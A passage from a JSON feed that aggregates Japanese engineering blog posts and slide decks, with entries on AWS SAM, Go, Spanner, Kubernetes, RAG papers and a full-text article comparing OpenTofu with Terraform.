\\rhttps://github.com/cncf/artwork/blob/main/projects/ko/icon/color/ko-icon-color.png","isoDate":"2025-02-19T05:00:00.000Z","dateMiliSeconds":1739941200000,"authorName":"bells17","authorId":"bells17"},{"title":"AWS SAM と GitHub Actions で爆速でサーバーレス API をデプロイする","link":"https://sreake.com/blog/aws-sam-quick-deploy-with-github-actions/","contentSnippet":"こんにちは。スリーシェイクの小林です。 本日は AWS Serverless Application Model（以下、AWS SAM）と GitHub Actions を用いて サーバーレス API の作成からデプロイ […]The post AWS SAM と GitHub Actions で爆速でサーバーレス API をデプロイする first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-02-16T23:00:00.000Z","dateMiliSeconds":1739746800000,"authorName":"Sreake","authorId":"Sreake"},{"title":"goroutineによる頻出並行処理パターン2選","link":"https://zenn.dev/kamos/articles/c334faad2d3b33","contentSnippet":"はじめにgoruotineはgo言語の軽量スレッドの仕組みであり、並行処理が比較的簡単に実装できます。しかしその自由度の高さから、慣れていない人にとってはどのように実装したらよいのか、という迷いが生まれてしまいます。その中でもよく使う並行処理のパターンは決まっており、今回はよく自分が使うパターンを2つ紹介します。 前提こういう遅くて、エラーも起こる関数をテーマにします。func slowFunction(arg string) (string, error) {\\tfmt.Printf(\\"SLOW FUNCTION START: %s\\\\n\\", arg)\\tstart :=...","isoDate":"2025-02-16T08:56:32.000Z","dateMiliSeconds":1739696192000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"自分ばっかり大変と思ってるときは気をつけたほうがいい","link":"https://nnaka2992.hatenablog.com/entry/2025/02/16/140946","contentSnippet":"仕事をしていて数年ほどたつと自分はこんなに頑張ってるのに評価が低いと思うタイミングが来る。これは後々そんなことはなかったと気がつくものの、そのタイミングにいる間は不適当な評価を受けていると思いがちで、自尊心が肥大しがちである。自分ばっかり頑張っていると感じたときは、自分の仕事が本当に価値を生んでいるのかという観点に立ち返ったほうがいい。やらなくてもいい仕事に忙殺されていないか？ 楽してると思ってる人は本質的な仕事に集中しているのではないか？これはイシューからはじめよでいうところの犬の道に陥っている状態である。自分だけ大変と思っているときは、実際には価値を生み出していないにも限らず、仕事量によ達成感を成果と勘違いしていることが多い。自分ばっかり大変だ、となっているときは価値の低いことに時間を投入していないか見つめ直そうという自戒。","isoDate":"2025-02-16T05:09:46.000Z","dateMiliSeconds":1739682586000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"【基礎】 GoでSpannerを使う","link":"https://zenn.dev/kamos/articles/b06c3ef3de894a","contentSnippet":"はじめにGoogleのSpannerデータベースはまだまだ知名度が低く、日本語での文献も豊富ではないため、いざ使うとなるとかなり苦労する技術です。ここでは最低限の概念を説明することにつとめ、通常利用においてSpannerのハードルを下げようと思いこの記事を執筆しました。基本的には以下の資料に載っている情報かと思いますが、実際にソースコードを見るとドキュメントの更新が追いついていない部分が多い印象でした。そのためクライアントライブラリのソースコードに可能な限り追従し、できるだけ平易な文章でまとめようと思います。https://cloud.google.com/spanner/do...","isoDate":"2025-02-16T03:29:52.000Z","dateMiliSeconds":1739676592000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"インフラをつくるとはどういうことなのか、 あるいはPlatform Engineeringについて","link":"https://speakerdeck.com/nwiizo/inhurawotukurutohadouiukotonanoka-aruihaplatform-engineeringnituite","contentSnippet":"2025年02月13日 Developers Summit 2025 13-E-4 にて「インフラをつくるとはどういうことなのか、 あるいはPlatform Engineeringについて - Platform Engineeringの効果的な基盤構築のアプローチ」というタイトルで登壇します。同日にPFEM特別回 でも登壇するのですが資料頑張って作ったのでそっちも読んでください。完全版は機会があればお話するので依頼してください。\\r\\rイベント名:  Developers Summit 2025\\r\\r公式URL: https://event.shoeisha.jp/devsumi/20250213\\r\\rセッションURL: https://event.shoeisha.jp/devsumi/20250213/session/5546\\r\\r登壇ブログ: https://syu-m-5151.hatenablog.com/entry/2025/02/14/071127","isoDate":"2025-02-13T05:00:00.000Z","dateMiliSeconds":1739422800000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"国内４大通信キャリアのビジネスまとめ表","link":"https://qiita.com/masaru-komiyama/items/07b8eec241e41c1e0ebb","contentSnippet":"ふと、「国内通信キャリア各社のビジネスってどうなってるんだろう。サクッと確認したいからまとまった表があるといいなぁ」　と検索した際、あまり良い情報がヒットしなかった ＆ AI使っても微妙な結果しか得られなかったので、各社の公開情報を参考に、2025/2/12時点での、国内４...","isoDate":"2025-02-13T01:24:19.000Z","dateMiliSeconds":1739409859000,"authorName":"masaru-komiyama","authorId":"masaru-komiyama"},{"title":"Platform Engineeringは自由のめまい ","link":"https://speakerdeck.com/nwiizo/platform-engineeringhazi-you-nomemai","contentSnippet":"2025年02月13日 Kubernetesで実践するPlatform Engineering発売記念！ PFEM特別回にて「Platform Engineeringは自由のめまい - 技術の選択における不確実性と向き合う」というタイトルで登壇します。同日にDevelopers Summit 2025 でも登壇したのですが資料頑張って作ったのでそっちも読んでください。\\r\\rイベント名: Kubernetesで実践するPlatform Engineering発売記念！ PFEM特別回\\r\\r公式URL: https://platformengineering.connpass.com/event/342670/\\r\\r登壇ブログ: https://syu-m-5151.hatenablog.com/entry/2025/02/14/071127","isoDate":"2025-02-12T05:00:00.000Z","dateMiliSeconds":1739336400000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"kubeadmでk8sクラスタを構築する","link":"https://zenn.dev/moz_sec/articles/k8s-by-kubeadm","contentSnippet":"KubernetesKubernetesとは、複数のコンピュータでコンテナをいい感じに動かしてくれるものです。Kubernetesの説明はいろんなサイトに書いてあるため、そちらを参照してください。公式サイトも参考になります。https://kubernetes.io/docs/concepts/overview/ kubeadmkubeadmは、Kubernetesクラスタを構築するためのツールの１つです。他にも、kopsやkubesprayなどがありますが、kubeadmは最小限の構成でクラスタを構築することができます。https://kubernetes.io/...","isoDate":"2025-02-07T02:00:09.000Z","dateMiliSeconds":1738893609000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"GKEのComputeClassに関する調査","link":"https://sreake.com/blog/gke-computeclass/","contentSnippet":"はじめに Sreake事業部で長期インターンをしている竜です。 本記事では、GKEのカスタムコンピューティングクラスについて調査を行いました。 カスタムコンピューティングクラスの概要 GKEのカスタムコンピューティングク […]The post GKEのComputeClassに関する調査 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-02-07T00:00:00.000Z","dateMiliSeconds":1738886400000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Kubernetes History Inspector(KHI)を触ってみた","link":"https://speakerdeck.com/bells17/kubernetes-history-inspector-khi-wohong-tutemita","contentSnippet":"スライド内の参考リンク・画像など引用元一覧\\r\\rhttps://zenn.dev/bells17/scraps/67c852e99ad5a5 \\rhttps://github.com/GoogleCloudPlatform/khi \\rhttps://zenn.dev/google_cloud_jp/articles/9a7dc0df5e8906 \\rhttps://blog.g-gen.co.jp/entry/kubernetes-history-inspector-introduction \\rhttps://x.com/kyasbal_k/status/1884500133183905976 \\rhttps://x.com/ryusa_eng/status/1886328704432996463 \\rhttps://x.com/kkuchima/status/1884503826029228189 \\rhttps://github.com/GoogleCloudPlatform/khi/blob/main/docs/en/images/gettingstarted-history.png\\rhttps://github.com/GoogleCloudPlatform/khi/blob/main/docs/en/images/gettingstarted-views.png \\rhttps://k8s-novice-jp.connpass.com/event/343899/ \\rhttps://jaguer-cloud-native.connpass.com/event/342024/","isoDate":"2025-02-05T05:00:00.000Z","dateMiliSeconds":1738731600000,"authorName":"bells17","authorId":"bells17"},{"title":"Terraform使いがOpenTofuについて入門してみる","link":"https://blog.masasuzu.net/entry/2025/02/04/185305","contentSnippet":"この記事はSRETT #11で発表されたものに加筆修正したものです。OpenTofuに関して調べたこととなります。3-shake SRE Tech Talk #11 オンサイト - connpass speakerdeck.com先日KubeCon + CloudNativeCon North America 2024に行ってきてました。その中で共同開催されていたOpenTofu Dayを見てOpenTofuに関して興味を持ちました。普段はTerraformを利用しており、あまりOpenTofuについては触ってきてないので、この機会に深堀りをしてみたいと思いました。参考: OpenTofu Dayまた、社内活動として技術検証を行っており、私の検証テーマとしてTerraformを中心としたIaC周りの技術調査を行ってるので、ちょうどいい機会だとも思いました。おことわりOpenTofuとはライセンス問題HashiCorp社の言い分コミュニティの懸念OpenTofuとTerraformの違いコマンドファイルRegistryremovedブロックState Encryptionbackendブロックの変数参照バージョン管理Security checkLinterCI/CDまとめ参考リンクライセンス変更フォークソースコード問題OpenTofuを使うためにHachiCorp買収おことわりこの記事はTerraformを知っている前提で書かれています。そのため細かい説明を省略している箇所があります。また筆者は普段はTerraformをメインで使用しており、OpenTofuを業務利用はしていません。OpenTofuとは2023年8月にTerraformを含めたHashiCorp製品のライセンスの変更を発表したことにより、これを懸念した企業やコミュニティによりOpenTFとしてフォークされます。その後OpenTFの名称はHashiCorp社の商標権への懸念からOpenTofuに改名されます。そのときの議論はissueを見るとたどることができます。参考: https://github.com/opentofu/opentofu/issues/2962023年9月にLinux Foundation傘下となります。参考: Linux Foundation Launches OpenTofu: A New Open Source Alternative to TerraformTerraformをフォークしたものなので基本的な使い勝手は同じです。コマンド名が terraform から  tofu に差し替えられています。ライセンス問題前項でさらっとライセンス変更と言いましたが、HashiCorp社は2023年8月に今後のリリースに関してライセンスを変更する旨を発表しました。これはオープンソースライセンスであるMozilla Public License（MPL） v2.0から商用サービスでの利用を制限するBusiness Source License（BUSLあるいはBSL） v1.1に変更するものです。参考: HashiCorp adopts Business Source Licenseこれに対して、利用企業およびコミュニティが懸念を示し、OpenTofuをフォークしたという流れになります。HashiCorp社の言い分従来BSLは本番使用(production use)が制限されます。ただし、ライセンスのParameterとして追加使用許可(Additional Use Grant)をすることによりTerraformと「競合製品」でなければ本番利用の制限はないとしてます。参考: https://github.com/hashicorp/terraform/blob/v1.11/LICENSE「競合製品」とは、有料サポート契約を含む第三者に販売される製品で、HashiCorp のライセンス対象製品の有料版の機能と大幅に重複する製品を指します。TerraformでいうところのHCP Terraform(Terraform Cloud)を想定しているのかと思います。また組織内でTerraformをホストして利用することは「競合製品」とはみなされなません。そのため利用者としては基本的には問題なく利用できるとしてます。参考: HashiCorp Licensing FAQ問題となるのはTerraformの機能を有償で提供しているSaaSと読み取れます。コミュニティの懸念HashiCorp社が説明したBSLと追加使用許可はあいまいであるとしてます。そのため、自身の行動が許諾範囲内か判断が困難である。「競合製品」の定義やライセンス自体が今後変更されるか不確実であると懸念を示してます。また、TerraformはOSSの恩恵を受けて成長してきてため、これからもオープンソースソフトウェアであるべきだと信じていると表明しています。参考: OpenTofu FAQOpenTofuのスポンサー企業としては以下のとおりです。HarnessGruntworkSpaceliftenv0ScalrHarnessはCI/CDまわりのSaaS製品、Gruntworksはterragruntの開発元、Specelift、env0、ScalrはTerraformをホストするSaaSサービスを運営しています。OpenTofuとTerraformの違いこの項ではそれぞれの違いについて説明していきます。OpenTofuはTerraform1.6-alphaからフォークされているのでそれまでに実装されていたものは互換があります。また、Terraform 1.6以降に追加された機能に関しても随時取り込まれています。そのため、1.5までの機能を使っているのであれば素直に移行できるかとは思います。バージョンごとに移行ガイドがあるので細かくはそれを参照すると良いです。参考: https://opentofu.org/docs/intro/migration/ただし、別のコードベースで開発がされているので、OpenTofuのみの独自実装もあります。ここではいくつか個人的に気になる違いについてあげていきます。コマンド基本的には terraform を tofuに置き換えていただければよいです。サブコマンドは一緒です。# Terraformterraform initterraform planterraform applyterraform destroy# OpenTofutofu inittofu plantofu applytofu destroyファイルterraform由来の .tf または .tofu の拡張子のファイルを設定ファイルとして認識します。json形式の .tf.json または .tofu.json の拡張子のファイルも同様です。同じディレクトリ内に.tf と .tofu の両方のファイルがあった場合、.tofu ファイルだけ認識して、.tf ファイルは無視されます。foo.tf  # <=== このファイルは無視されるfoo.tofuRegistryTerraform同様OpenTofuにもプロバイダーやモジュールのレジストリがあります。Terraform: https://registry.terraform.io/OpenTofu: https://registry.opentofu.orgOpenTofu Registryが登場したときに存在したTerraform Providerは反映されています。反映されていないものに関してもissueを立てれば反映されるようですhttps://github.com/opentofu/registryremovedブロックremovedブロックは既存のリソースを削除することなく、stateから削除することができます。それぞれ下記のように記述できます。下記の例ではAWSインスタンス自体は削除せず、stateから外すことを意図してます。# Terraformremoved {  from = aws_instance.example  lifecycle {    destroy = false  }}# OpenTofuremoved {  from = aws_instance.example}Terraformではlifecyleブロックでdestroy=falseの記述が必須です。参考: https://developer.hashicorp.com/terraform/language/resources/syntax#removing-resourcesOpenTofuではremovedブロックを書くだけで stateから削除されます。参考: https://opentofu.org/docs/language/resources/syntax/#removing-resourcesremovedブロックでやりたいことはstateから削除することなので、単純にリソースを削除したいなら対象resouceブロックを削除すればいいので、Terraformの記述方法のほうがへんな気がします。State EncryptionTerraformでは平文でStateに保存されてしまうという問題がありましたが、OpenTofuではクライアントサイドで暗号化する機能が追加されてます。クラウドプロバイダーの KMSキーなどを利用してStateを暗号化することができます。参考: State and Plan Encryption | OpenTofuTerraformではたとえsopsプロバイダーで機密情報を暗号化しても、Stateファイルには平文で保存されているので権限があれば機密情報が見えてしまう状態にありました。State自体が暗号化されることにより機密情報をよりセキュアに扱えるようになります。参考: Terraformのsopsプロバイダーを使用するだけで機密情報は守られるのか - 目の前に僕らの道があるbackendブロックの変数参照OpenTofuではbackendブロックで変数参照ができます参考: https://opentofu.org/docs/language/settings/backends/configuration/#variables-and-localsvariable \\"env\\" {  type    = string}locals {  path = \\"${var.env}/terraform.tfstate\\"}terraform {  backend \\"local\\" {    path = local.path  }}tofu init -var=\\"env=dev\\" -reconfiguretofu plan -var=\\"env=dev\\"Terraformで同じことをしたい場合、-backend-configを渡さないといけないため、backendを切り替える際に不便となります。terraform init -backend-config=./envs/dev/terraform.backend -reconfigureterraform plan -vars-file=./envs/dev/terraform.tfvarsOpenTofu DayのLTで紹介されてた環境名だけを渡して挙動を切り替えるパターンが現状だとterraformでは使えません参考:On Best Practices with OpenTofu Structuringバージョン管理複数プロジェクトでTerraform or OpenTofuを使う場合、プロジェクトごとに使用バージョンを管理する必要があります。いくつか選択肢を見ていきます。Terraformのバージョン管理ツールとしてよく使われるtfenvはOpenTofuには対応しません。参考:https://github.com/tfutils/tfenv/issues/409代わりにTerraformとOpenTofuに対応したtenvができました。こちらを利用すると良さそうです。https://github.com/tofuutils/tenv私はTerraformも合わせてプロジェクト内のツールのバージョン管理をまとめてasdfでやってますが、こちらは対応しています。https://github.com/virtualroot/asdf-opentofu自分はあまり使わないのですが、同じようなツールのaquaやmiseも両対応しています。https://aquaproj.github.io/https://github.com/jdx/miseSecurity checkTerraformだとtfsec(現 trivy config)がセキュリティチェックとして使われてるかと思います。ディスカッションはされており優先順位をつけて対応するとのことです。参考: https://github.com/aquasecurity/trivy/discussions/5069LintertflintはOpenTofuをサポートしないようです。参考: https://github.com/terraform-linters/tflint/issues/2037Linterの議論自体はissueで続いているようです。参考: https://github.com/opentofu/opentofu/issues/2213CI/CDHCP Terraform(旧Terraform Cloud)に相当するSaaSとしては、OpenTofuスポンサーのSpacelift、env0、Scalrなどがあります。tfactions、atlantis、diggerもOpenTofuに対応している模様です。まとめ現時点でOpenTofuに移行するするべきか?の問については、利用者側として現状では引き続き様子見かと思います。足回りも概ね揃ってきているが、まだ足りないエコシステムもあります。気になるところではIBM社にHashiCorp社の買収による統合完了の様子も追っていきたいところです。予定では2025年の1-3月期に統合完了するとのことなので、その後なにか動きがあるかもしれません。参考: IBM社によるHashiCorp社買収についてとはいえ、1つのツールが使えなくなることで業務が止まるのは避けたいので常に選択肢は複数取っておきたいところです。エンジニアとしてはOpenTofuに限らず、Pulumi、CDK(AWS)なども選択肢として取っておきたいです。それはそれとして、OpenTofuはTerraformとは違う独自進化をしているので、変更を追っていきたいところです。個人的にはState暗号化とかBackendの変数参照とかTerraformに入ってほしいです。それでは良い豆腐ライフを!、、、。ここまで書いてきたのですが、minamijoyoさんのTerraform職人のためのOpenTofu再入門2024がものすごく詳しいので、この記事以上に参考になるかと思います。参考リンクライセンス変更HashiCorp adopts Business Source LicenseHashiCorp | The Infrastructure Cloud CompanyHashiCorp、全製品のライセンスを商用利用に制限があるBSLライセンスに変更すると発表 － PublickeyTerraformのライセンスの変更とその影響何故、TerraformのBUSL-1.1へのライセンス変更は反発を受けたのか？ – Shuji SadoTerraform のライセンス変更についての考察 #Azure - QiitaフォークTerraformのフォークが「OpenTofu」としてLinux Foundation傘下で正式ローンチ。OpenTFから改名 － Publickeyソースコード問題【Infostand海外ITトピックス】ライセンスをめぐって対立　HashiCorpと「Terraform」派生のOpenTofu - クラウド WatchHashiCorp、TerraformをフォークしたOpenTofuに対しコードの不正コピーを警告。OpenTofuは完全否定 － PublickeyOpenTofuを使うためにTerraform職人のためのOpenTofu再入門2024 #Terraform - QiitaTerraform職人のためのOpenTofu入門 #Terraform - QiitaOpenTofuopentofu/opentofu: OpenTofu lets you declaratively manage your cloud infrastructure.Migrating to OpenTofu 1.7.x from Terraform | OpenTofuHachiCorp買収IBMがHashiCorpを64億ドルで買収、TerraformとAnsibleのシナジー効果などを見込む | IT LeadersIBM Japan Newsroom - ニュースリリースIBM社によるHashiCorp社買収について","isoDate":"2025-02-04T09:53:05.000Z","dateMiliSeconds":1738662785000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"2025-01-31 吉祥寺.pm 37 初めての海外カンファレンス","link":"https://speakerdeck.com/masasuzu/2025-01-31-ji-xiang-si-dot-pm-37-chu-metenohai-wai-kanhuarensu","contentSnippet":"KubeCon NA 2024に行ってきたのでその経験を話します。\\r\\r吉祥寺.pm 37で話しました。\\rhttps://kichijojipm.connpass.com/event/339040/","isoDate":"2025-01-31T05:00:00.000Z","dateMiliSeconds":1738299600000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"AWS Lambda Web Adapter の Function URL を Cloudfront で公開する","link":"https://blog.1q77.com/2025/01/aws-lambda-web-adapter-with-cloudfront/","contentSnippet":"これまでのおさらい前回、AWS Web Adapter を用いた AWS Lambda に Function URL を使って公開することはできた。今回はこれをカスタムドメインで公開するべく CloudFront と連携させます。OAC (Origin Access Control)2024年4月に CloudFront と Function URL の間を OAC (Origin Access Control) を使って Function URL への直アクセスを防ぐことができるようになっていたのでこれも試します。Amazon CloudFront が Lambda 関数 URL オリジンのオリジンアクセスコントロール (OAC) を新たにサポート","isoDate":"2025-01-30T15:01:24.000Z","dateMiliSeconds":1738249284000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"AWS Lambda Web Adapter でお手軽 Web Service 公開","link":"https://blog.1q77.com/2025/01/aws-lambda-web-adapter/","contentSnippet":"ずっと AWS にも Cloud Run が欲しいなあと思っていました。AppRunner はコレじゃない…そんなある日、あれ？ AWS Lambda でいけんじゃね？と思い検索すると","isoDate":"2025-01-29T15:40:00.000Z","dateMiliSeconds":1738165200000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Renovate を手元の repository に対して debug 実行する","link":"https://blog.1q77.com/2025/01/renovate-local-debug/","contentSnippet":"renovate の設定を手元で試行錯誤したい時のメモです。Local Platform--platform=local を指定して実行すると local filesystem を対象として renovate を実行することができます。https://docs.renovatebot.com/modules/platform/local/手元の working copy の root directory で実行します。(npx は使わなくても良いが install からやってくれるので)","isoDate":"2025-01-28T10:45:08.000Z","dateMiliSeconds":1738061108000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"論文紹介 ”Long-Context LLMs Meet RAG: Overcoming Challenges for Long Inputs in RAG” @GDG Tokyo","link":"https://speakerdeck.com/shukob/lun-wen-shao-jie-long-context-llms-meet-rag-overcoming-challenges-for-long-inputs-in-rag-at-gdg-tokyo","contentSnippet":"https://gdg-tokyo.connpass.com/event/340671/\\r\\r大規模言語モデル（LLM）は、外部の知識源を利用することで、より強力な応答を生成できるようになります（これをRetrieval-Augmented Generation: RAGと呼びます）。LLMが処理できる入力テキストの長さが長くなるにつれて、より多くの関連情報をRAGで与えられるようになり、生成される回答の質が向上することが期待されます。一般的には、取得する情報が多いほど関連情報（高い再現率）も増え、結果として性能が向上すると考えられます。\\r\\rしかし、長文処理LLMにおけるRAGの性能が、取得する情報が増えすぎると逆に低下する現象を明らかにし、その原因が「ハードネガティブ」な情報にあることを示しました。そして、その問題を解決するために、効果的な学習不要および学習を伴うアプローチを提案しています。","isoDate":"2025-01-28T05:00:00.000Z","dateMiliSeconds":1738040400000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Site Reliability Engineering on Kubernetes","link":"https://speakerdeck.com/nwiizo/site-reliability-engineering-on-kubernetes","contentSnippet":"2025年01月26日 10:35-11:05（ルーム A）にて「Site Reliability Engineering on Kubernetes」というタイトルで登壇します。\\r\\rイベント名: SRE Kaigi 2025\\r\\r公式URL: https://2025.srekaigi.net/\\r\\rセッションURL: https://fortee.jp/sre-kaigi-2025/proposal/a75769d1-7835-4762-a1f6-508e714c8c8e\\r\\r登壇ブログ: https://syu-m-5151.hatenablog.com/entry/2025/01/26/005033","isoDate":"2025-01-26T05:00:00.000Z","dateMiliSeconds":1737867600000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"スリーシェイクにおけるOSSの取り組み","link":"https://speakerdeck.com/bells17/surisieikuniokeruossnoqu-rizu-mi","contentSnippet":"3-shake SRE Tech Talk #11 オンサイトの登壇資料です。\\r\\rhttps://3-shake.connpass.com/event/339212/","isoDate":"2025-01-24T05:00:00.000Z","dateMiliSeconds":1737694800000,"authorName":"bells17","authorId":"bells17"},{"title":"OpenClarityを覗いてみる","link":"https://speakerdeck.com/kojake_300/openclaritywosi-itemiru","contentSnippet":"","isoDate":"2025-01-24T05:00:00.000Z","dateMiliSeconds":1737694800000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"2025-01-24-SRETT11-OpenTofuについてそろそろ調べてみるか","link":"https://speakerdeck.com/masasuzu/2025-01-24-srett11-opentofunituitesorosorodiao-betemiruka","contentSnippet":"OpenTofuについて調べてみた内容\\r\\rSRETT #11 https://3-shake.connpass.com/event/339212/","isoDate":"2025-01-24T05:00:00.000Z","dateMiliSeconds":1737694800000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"論文紹介 ”Long-Context LLMs Meet RAG: Overcoming Challenges for Long Inputs in RAG”","link":"https://speakerdeck.com/shukob/lun-wen-shao-jie-long-context-llms-meet-rag-overcoming-challenges-for-long-inputs-in-rag","contentSnippet":"https://genai-users.connpass.com/event/341391/\\r\\r大規模言語モデル（LLM）は、外部の知識源を利用することで、より強力な応答を生成できるようになります（これをRetrieval-Augmented Generation: RAGと呼びます）。LLMが処理できる入力テキストの長さが長くなるにつれて、より多くの関連情報をRAGで与えられるようになり、生成される回答の質が向上することが期待されます。一般的には、取得する情報が多いほど関連情報（高い再現率）も増え、結果として性能が向上すると考えられます。\\r\\rしかし、長文処理LLMにおけるRAGの性能が、取得する情報が増えすぎると逆に低下する現象を明らかにし、その原因が「ハードネガティブ」な情報にあることを示しました。そして、その問題を解決するために、効果的な学習不要および学習を伴うアプローチを提案しています。","isoDate":"2025-01-21T05:00:00.000Z","dateMiliSeconds":1737435600000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"interface、structで書くか、functionで書くか","link":"https://zenn.dev/kamos/articles/e044ae9cbb9f4c","contentSnippet":"始めにこの正月に、関数型ドメインモデリングという本を読みました。良書でした。https://amzn.asia/d/4NlwXFgそこで、今までオブジェクトで書いていたコードを関数としてかけないか?という思いつきでこの記事を書いた結果、なんだか関数型とは関係ない感じの記事になってしまいました。ご容赦ください。 ベースとなるサンプルコードまずはオブジェクト指向でよく使う形のサンプルを用意しました。タスク管理のモデルです。簡単のため、エラーなどはあまり返さないようにしています。domain/user.gopackage domainimport \\"fmt\\"typ...","isoDate":"2025-01-12T08:31:09.000Z","dateMiliSeconds":1736670669000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"2024年の振り返りをする","link":"https://nnaka2992.hatenablog.com/entry/2024/12/31/2024_furikaeri","contentSnippet":"みんな振り返りしてる。振り返りしてないのはお前だけ。なので振り返りします。登壇関係2024-03-29 3-shake SRE Tech Talk #9 - connpass2024年の登壇はじめは所属会社である株式会社スリーシェイクの主催するイベントでした。データベーススペシャルということでDB関連がメインの回で、メインセッションとして30分枠で登壇しました。内容はo11yとデータベースを主軸とした話です。個人的には今後データベースのスロークエリ検知は従来のスロークエリログを利用する方法からo11yのトレースを通して発見していく方法が主流になるのではと思っています。データベースにオブザーバビリティを注入する - Speaker DeckSRETTというイベントがインフラ・SRE・アプリケーション側の試聴者が多いだろうと考えて、少しアプリ・SREよりの内容にしようとo11yをメインに据えた記憶があります。2024-04-26 YugabyteDB Japan Meetup #3登壇はじめからはなかなかのハイペースで、1ヶ月経たないうちにGoogle CloudのコミュニティであるJagu\'e\'rでの登壇です。やはりここもDBREの文脈でデータベースでブルーグリーンをできるようにしようという内容です。Jagu\'e\'r Observability-SRE分科会 Meetup#7 ハイブリッド - connpassGoogle CloudのDBにもAWS RDSのブルーグリーン相当の機能が欲しいです。2024-06-05 Google Cloud非公開イベントGoogle Cloudがパートナー向けに開催している非公開イベントでの登壇でした。2024年4月のGoogle Cloud Nextで発表された「全てのDBにベクトル検索を搭載します」という内容に衝撃を受けて、話した内容だった気がします。確かにすごいですが、全部のDBに必要なのかと問われると疑問です。Google Cloud で利用できるRDBのベクトル検索を徹底解剖！ - Speaker Deck結論としては特別な理由がなければCloud SQLを使え、です。2024-07-17 YugabyteDB Japan Meetup #5 - connpass約1年ぶりのYugabyteDB Japan Meetupのリベンジ登壇です。初回がなぜかDBREの話をしてYugabyteDBの話はフレーバー程度になってしまったので、本腰を入れてYugabyteDBならではの話をしました。大規模マルチテナントを解決するYugabyteDBという選択肢 - Speaker DeckYugabyteDBはメジャーなNewSQLでは唯一RLSをサポートしており、スケールアウトとセキュリティを両立したデータベースなので大規模マルチテナントの最適解では？　という内容です。この考えはAurora DSQLの登場でも意見は変わりませんが、Limitlessでいいのでは？　という気持ちはあります。2024-08-30 Jagu\'e\'r Cloud Native #15 ハイブリッド Meetup - connpass2024年2回目のJagu\'e\'rでの登壇でした。Google Cloudと不仲と噂されていたOracleの関係改善に驚いた結果話した内容です。やっていることはシンプルでOracle DBをKubernetesでうごかすOperatorを紹介しています。GoogleとOracle：この二人は友達になれました～GKEでOraOperatorを動かそう～ - Speaker Deckこの9月末まではGoogle Cloudのパートナーエンジニア表彰プログラムである、Google Cloud Partner Top Engineerの評価期間であったためGoogle Cloudに偏重した登壇を行っていました。2024-10-01 Kubernetes Novice Tokyo #34 - connpassJagu\'e\'r Cloud Native #15で登壇した内容を一部保管しつつ、されつつといった内容の登壇でした。@bells17_が運営のひとりなのでOracle DB on Kubernetesの話をするので早く開催してくださいとプレッシャーをかけた覚えがあります。その節はお世話になりました。登壇した直後にOracle DBの話しすぎて、Kubernetesユーザーからするとちょっと違うなという話をしてしまったと反省した記憶があります。Kubernetes上でOracle_Databaseの運用を楽にするOraOperatorの紹介 - Speaker Deckこの時期はOracle DB x Kubernetesの熱が上がりましたが、今はそこまででもありません。今はやっぱりPostgreSQLだとCloud NativePGに熱を上げてます。2024-12-17 Database Engineering Meetup #5 - connpass2024年の登壇納はDatabase Engineering Meetupでした。ちょうど11月下旬ごろにKubeCon NA 2024があり、そこでDB関連のセッションが半年前のKubeConから3倍近くに増えておりそれをまとめた内容です。KubeCon NA 2024の全DB関連セッションを紹介 - Speaker Deck2024年のはじめごろはGoogle Cloudを中心としたパブリッククラウドを主軸としたCloud Nativeから、Oracle x GKEを通してKubernetesという流れでした。データベースエンジニアを自称する限り、Kubernetesからは逃げられないと思っています。来年もKubernetesを頑張ります。2024年は全部で7本の登壇をしたようです。ブログ関連はてなブログでは主に読んだ論文やドキュメント、セッションレポートなどをまとめ、zennでは何かを調べてまとめたものや検証した結果をまとめるように使い分け運用しました。12月のアドベントカレンダーシーズンにKubeCon NAのセッションレポートを書いていたところ、最後の投稿が2023年の振り返りをするで焦ったのは秘密です。nnaka2992.hatenablog.comzennの方は2023年と同様に社内向けに話すもののうち社外に出しても問題ないようなものを垂れ流していましす。2025年も引き続き技術検証方面に力をいれたいのでzennを活発に出来たらなと思います。全部で11本のブログを書いたようです。まとめ2024年はがむしゃらに本数を意識した1年でした。来年も数にはこだわっていきたいですが、内容はKubernetesとPostgreSQLとGoogle Cloudあたりに注力していけたらいいなと思っています。","isoDate":"2024-12-31T13:22:33.000Z","dateMiliSeconds":1735651353000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"rootful・rootless・privilegedコンテナの違い/rootful_rootless_privileged_container_difference","link":"https://speakerdeck.com/moz_sec_/rootful-rootless-privileged-container-difference","contentSnippet":"2024/12/28に開催されたOWASP KansaiのLTの資料です。\\rhttps://owasp-kansai.doorkeeper.jp/events/179740","isoDate":"2024-12-28T05:00:00.000Z","dateMiliSeconds":1735362000000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"CloudFrontの新機能『VPCオリジン』をTerraformで書いてみた","link":"https://zenn.dev/nextbeat/articles/aws_vpc_origin","contentSnippet":"1.VPCオリジンとは？AWS公式ブログでの記載Amazon Virtual Private Cloud (Amazon VPC) 内のプライベートサブネットでホストされているアプリケーションからのコンテンツ配信を可能にする新機能です。AWS re:Invent 2024で新発表された機能です。プライベートサブネット内のアプリケーションを直接CloudFrontを通じて配信可能なため、よりセキュアな構成を実現できる機能です。 従来の構成イメージ VPCオリジンを用いた構成イメージ 2.メリット 